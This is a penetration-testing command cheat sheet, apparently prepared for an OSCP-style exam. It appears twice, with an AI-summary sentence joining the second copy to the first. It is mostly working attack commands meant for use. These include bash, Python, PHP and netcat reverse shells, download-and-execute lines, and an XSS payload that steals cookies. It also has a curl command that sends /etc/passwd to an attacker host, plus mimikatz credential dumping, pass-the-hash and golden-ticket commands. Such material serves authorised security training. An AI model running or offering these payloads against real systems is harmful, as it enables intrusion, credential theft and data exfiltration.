### 1. RECONNAISSANCE & ENUMERATION

**1.1 Network Scanning – Nmap**
*   **Host Discovery**: ```nmap -sn 192.168.1.0/24``` (Ping sweep) or ```nmap -sn -PS80,443 192.168.1.0/24``` (TCP SYN ping sweep).
*   **Port Scanning**: ```nmap -sV -sC -O -p- -T4 <target>``` (Full scan) or ```nmap -sS -sV -sC -p 1-65535 --open <target>``` (Stealth SYN scan).
*   **UDP Scanning**: ```nmap -sU -p 161,69,123 <target>```.
*   **Output & Scripts**: ```nmap -oA scan_output <target>``` (Save all formats), ```nmap --script vuln <target>``` (Vulnerability scripts), or ```nmap --script=banner <target>``` (Banner grabbing).

**1.2 Web Enumeration**
*   **Directory Brute-forcing**: ```gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt```, ```feroxbuster -u http://<target> -w /usr/share/wordlists/dirb/common.txt```, or ```wfuzz -c -w /usr/share/wordlists/rockyou.txt --hc 404 http://<target>/FUZZ```.
*   **Subdomain Fuzzing**: ```gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt``` or ```ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<target>```.

**1.3 DNS Enumeration**
*   **Lookups**: ```host <domain>```, ```host -t mx <domain>``` (Mail), or ```host -t ns <domain>``` (Nameservers).
*   **Zone Transfers**: ```host -t axfr <domain> <ns>```, ```dig axfr <domain> @<nameserver>```, or ```dnsrecon -d <domain> -t axfr```.

**1.4 SMB Enumeration**
*   **Share Enumeration**: ```smbclient -L //<target> -N``` (Null session) or ```smbmap -H <target>```.
*   **User/Info Enumeration**: ```enum4linux -a <target>``` or ```crackmapexec smb <target> --shares -u '' -p ''```.
*   **RPC Session**: ```rpcclient -U '' <target>``` with sub-commands like ```enumdomusers``` and ```queryuser <RID>```.

**1.5 LDAP Enumeration (Active Directory)**
*   **Search**: ```ldapsearch -x -H ldap://<DC> -b 'dc=domain,dc=com' -s sub '(objectClass=*)'```.
*   **WindapSearch**: ```windapsearch -d domain.com --dc <DC_IP> -U``` (Users) or ```-G``` (Groups).

---

### 2. VULNERABILITY SCANNING

*   **Nikto**: ```nikto -h http://<target>``` for web vulnerability scans.
*   **Fingerprinting**: ```whatweb http://<target>``` and ```wafw00f http://<target>``` (WAF detection).
*   **Searchsploit**: ```searchsploit <service> <version>``` to find exploits or ```searchsploit -m <exploit-id>``` to copy them.

---

### 3. EXPLOITATION

**3.1 Metasploit Framework**
*   **Setup**: ```msfconsole```, ```search <module>```, ```use <module>```, and ```set RHOSTS <target>```.
*   **Session Management**: ```sessions -l``` (List), ```sessions -i <id>``` (Interact), or ```sessions -u <id>``` (Upgrade to meterpreter).

**3.2 Reverse Shells**
*   **Bash**: ```bash -i >& /dev/tcp/<IP>/<PORT> 0>&1```.
*   **Python**: ```python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'```.
*   **Netcat**: ```nc <IP> <PORT> -e /bin/bash``` or ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f```.
*   **PowerShell**: ```powershell -e <base64_encoded_payload>```.
*   **MSFvenom**: ```msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf``` or ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe```.

**3.3 Listeners & Stabilization**
*   **Listeners**: ```nc -lvnp <PORT>``` or ```rlwrap nc -lvnp <PORT>```.
*   **TTY Upgrade**: ```python3 -c 'import pty;pty.spawn("/bin/bash")'```, followed by ```Ctrl+Z```, ```stty raw -echo; fg```, and ```reset```.
*   **Socat**: ```socat file:tty,raw,echo=0 tcp-listen:<PORT>``` (Attacker) and ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>``` (Target).

---

### 4. FILE TRANSFER

*   **Linux**: ```python3 -m http.server 8080``` (Attacker) and ```wget http://<IP>:8080/file.sh -O /tmp/file.sh``` (Target).
*   **Windows**: ```IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')```, ```certutil -urlcache -f http://<IP>/file.exe file.exe```, or ```impacket-smbserver share . -smb2support```.

---

### 5. PRIVILEGE ESCALATION

**5.1 Linux**
*   **Enumeration**: ```id```, ```whoami```, ```sudo -l```, ```cat /etc/crontab```, and ```find / -perm -u=s -type f 2>/dev/null``` (SUID files).
*   **Automated**: ```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash```.
*   **Abuse**: ```sudo find . -exec /bin/sh \; -quit``` or ```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```.

**5.2 Windows**
*   **Enumeration**: ```systeminfo```, ```whoami /priv```, ```tasklist /SVC```, and ```reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated```.
*   **Automated**: ```.\winPEAS.exe > winpeas_out.txt``` or ```Invoke-AllChecks``` using ```PowerUp.ps1```.
*   **Techniques**: ```.\PrintSpoofer64.exe -i -c cmd``` (Token Impersonation) or ```msiexec /quiet /qn /i C:\Temp\shell.msi``` (AlwaysInstallElevated).

---

### 6. ACTIVE DIRECTORY ATTACKS

*   **BloodHound**: ```.\SharpHound.exe -c All``` (Collection) and ```bloodhound-python -u user -p password -d domain.com -dc <DC_IP> -c All```.
*   **Kerberos**: ```impacket-GetNPUsers``` (ASREPRoasting) and ```impacket-GetUserSPNs``` (Kerberoasting).
*   **Pass-the-Hash**: ```crackmapexec smb <target> -u admin -H <NTLM_hash>``` or ```impacket-psexec domain/admin@<target> -hashes :NTLMhash```.
*   **Credential Dumping**: ```impacket-secretsdump domain/admin:pass@<target>``` or ```mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit```.
*   **Tickets**: ```mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.com /sid:<domain_SID> /krbtgt:<NTLM> /ptt" exit```.

---

### 7. WEB APPLICATION ATTACKS

*   **SQL Injection**: ```sqlmap -u 'http://<target>/page.php?id=1' --dbs``` or manual testing with ```' OR '1'='1```.
*   **LFI/RFI**: ```?file=../../../../etc/passwd``` or ```?file=php://filter/convert.base64-encode/resource=index.php```.
*   **XSS**: ```<script>alert(1)</script>``` or cookie stealing via ```<script>document.location='http://<IP>/steal?c='+document.cookie</script>```.

---

### 8. PASSWORD ATTACKS

*   **Offline Cracking**: ```hashcat -m 1000 hash.txt rockyou.txt``` (NTLM) or ```john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt```.
*   **Online Attacks**: ```hydra -l admin -P rockyou.txt ssh://<target>``` or ```crackmapexec smb <target_range> -u admin -P rockyou.txt```.

---

### 9. POST EXPLOITATION & PIVOTING

*   **Meterpreter**: ```sysinfo```, ```hashdump```, ```migrate <pid>```, and ```portfwd add -l 3389 -p 3389 -r <target>```.
*   **Tunneling**: ```ssh -D 1080 user@<jumphost>``` (SOCKS proxy) or ```chisel client <attacker>:8000 R:socks```.
*   **Data Exfiltration**: ```cat /etc/passwd | base64 | curl -X POST http://<attacker>/exfil -d @-```.

---

### 10. BUFFER OVERFLOW (Windows x86)

1.  **Spiking**: ```generic_send_tcp <IP> <PORT> spike_script.spk 0 0```.
2.  **Fuzzing**: ```python3 fuzzer.py```.
3.  **Find Offset**: ```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>```.
4.  **Bad Chars**: ```!mona bytearray -b '\x00'``` and ```!mona compare -f C:\mona\bytearray.bin -a <ESP address>```.
5.  **JMP ESP**: ```!mona jmp -r esp -cpb '\x00'```.
6.  **Payload**: ```msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b '\x00' -f py```.


	This is the **ultimate consolidated command reference** based on the sources, integrating all enumeration, exploitation, and post-exploitation techniques into a single comprehensive guide.

### 1. RECONNAISSANCE & ENUMERATION

**1.1 Network & Port Scanning (Nmap)**
*   **Host Discovery**: ```nmap -sn 192.168.1.0/24``` (Ping sweep) or ```nmap -sn -PS80,443 192.168.1.0/24``` (TCP SYN ping).
*   **Port Scanning**:
    *   **Full Scan**: ```nmap -sV -sC -O -p- -T4 <target>```.
    *   **Stealth SYN**: ```nmap -sS -sV -sC -p 1-65535 --open <target>```.
    *   **Targeted**: ```nmap -p 80,443,8080,8443 <target>```.
*   **NSE Scripts**: ```nmap --script vuln <target>``` (General), ```nmap --script http-enum <target>``` (Web), or ```nmap --script smb-vuln* <target>``` (SMB).

**1.2 Web & DNS Enumeration**
*   **Directory Fuzzing**: 
    *   ```gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt```.
    *   ```feroxbuster -u http://<target> -w /usr/share/wordlists/dirb/common.txt```.
*   **Vhost/Subdomain**: ```ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<target>```.
*   **DNS**: ```host -t axfr <domain> <ns>``` or ```dig axfr <domain> @<nameserver>``` (Zone Transfers).

**1.3 SMB & LDAP (Active Directory)**
*   **SMB**: ```smbclient -L //<target> -N``` (Null session list) or ```enum4linux -a <target>``` (Comprehensive enum).
*   **LDAP**: ```ldapsearch -x -H ldap://<DC> -b 'dc=domain,dc=com' -s sub '(objectClass=*)'```.
*   **WindapSearch**: ```windapsearch -d domain.com --dc <DC_IP> -U``` (Users) or ```-G``` (Groups).

---

### 2. EXPLOITATION & SHELLS

**2.1 Reverse Shell Payloads**
*   **Bash**: ```bash -i >& /dev/tcp/<IP>/<PORT> 0>&1```
*   **Python**: ```python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'```
*   **PHP**: ```php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'```
*   **Netcat**: ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f```
*   **MSFvenom**: 
    *   ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe```
    *   ```msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php```

**2.2 Shell Stabilization (TTY Upgrade)**
1.  ```python3 -c 'import pty;pty.spawn("/bin/bash")'```
2.  ```Ctrl+Z```
3.  ```stty raw -echo; fg```
4.  ```reset```
5.  ```export TERM=xterm; export SHELL=bash; stty rows 40 cols 200```

---

### 3. PRIVILEGE ESCALATION

**3.1 Linux PrivEsc**
*   **Automated**: ```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash```.
*   **Manual Checks**: ```sudo -l``` (Permissions), ```find / -perm -u=s -type f 2>/dev/null``` (SUID), and ```getcap -r / 2>/dev/null``` (Capabilities).
*   **Abuse**: ```sudo find . -exec /bin/sh \; -quit``` or ```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```.

**3.2 Windows PrivEsc**
*   **Automated**: ```.\winPEAS.exe > winpeas_out.txt``` or ```Invoke-AllChecks``` via PowerUp.ps1.
*   **Privileges**: ```whoami /priv``` (Look for ```SeImpersonatePrivilege```).
*   **Token Impersonation**: ```.\PrintSpoofer64.exe -i -c cmd``` or ```.\GodPotato-NET4.exe -cmd 'cmd /c whoami'```.
*   **Installation**: ```msiexec /quiet /qn /i C:\Temp\shell.msi``` (if AlwaysInstallElevated is 0x1).

---

### 4. ACTIVE DIRECTORY & POST-EXPLOITATION

**4.1 AD Attacks**
*   **BloodHound**: ```.\SharpHound.exe -c All``` or ```bloodhound-python -u user -p password -d domain.com -dc <DC_IP> -c All```.
*   **Kerberos**: 
    *   **ASREPRoasting**: ```impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass```.
    *   **Kerberoasting**: ```impacket-GetUserSPNs domain.com/user:password -request```.
*   **Movement**: ```impacket-secretsdump domain/admin:pass@<target>``` (Dump hashes) and ```impacket-psexec domain/admin@<target> -hashes :NTLMhash``` (Pass-the-Hash).

**4.2 Pivoting & Tunneling**
*   **SSH**: ```ssh -D 1080 user@<jumphost>``` (SOCKS Proxy).
*   **Chisel**: ```./chisel server -p 8000 --reverse``` (Attacker) and ```./chisel client <attacker>:8000 R:socks``` (Target).
*   **Socat Relay**: ```socat TCP-LISTEN:8080,fork TCP:<internal>:80```.

---

### 5. BUFFER OVERFLOW (Windows x86)

1.  **Spiking/Fuzzing**: Identify crash point.
2.  **Offset**: Find EIP location with ```pattern_create.rb``` and ```pattern_offset.rb```.
3.  **Bad Chars**: Identify with ```!mona bytearray -b '\x00'``` and ```!mona compare```.
4.  **JMP ESP**: Find address with ```!mona jmp -r esp -cpb '\x00'```.
5.  **Payload**: ```msfvenom -p windows/shell_reverse_tcp ... -b '\x00' -f py```.
6.  **Exploit**: ```padding + JMP_ESP + NOP_Sled (\x90 * 16) + shellcode```.

---

### 6. EXAM COMPLIANCE (Proof Requirements)

For every compromised machine, screenshots **must** show the IP address and flag together:
*   **Linux**: ```ip a && whoami && cat local.txt``` (or ```proof.txt```).
*   **Windows**: ```ipconfig /all && whoami && cat local.txt``` (typically on Desktop).